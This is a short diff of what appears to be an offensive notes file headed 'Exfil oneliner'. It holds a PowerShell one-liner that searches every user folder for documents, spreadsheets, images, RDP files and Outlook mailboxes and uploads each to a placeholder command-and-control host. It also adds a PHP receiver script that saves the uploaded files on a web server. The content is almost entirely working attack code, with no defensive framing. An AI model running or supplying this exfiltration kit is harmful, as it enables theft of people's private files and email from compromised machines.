@@ -5,3 +5,25 @@ Exfil oneliner
 [void]((@(get-childitem $env:homedrive\users\* -Recurse -ea 0) | ? { $_ -match '.txt|.doc|.docx|.rdp|.xls|.xlsx|.jpg|.png|.pst' } | select FullName) -replace 'Fullname','' -replace '@{=','' -replace '}','' | % { (new-object system.net.webclient).uploadfile("http://CC:PORT/test.php",$_) })
 
 ```
+
+```
+#//upload.php
+
+<?php
+  if(!empty($_FILES))
+  {
+    $path = "/var/www/html/";
+
+
+
+    $path = $path . md5(mt_rand()*mt_rand()) . basename( $_FILES['file']['name']);
+
+    if(move_uploaded_file($_FILES['file']['tmp_name'], $path)) {
+     
+    echo 'ok' .PHP_EOL;
+    } else{
+      
+    echo 'not ok'. PHP_EOL;
+    }
+  }
+?>
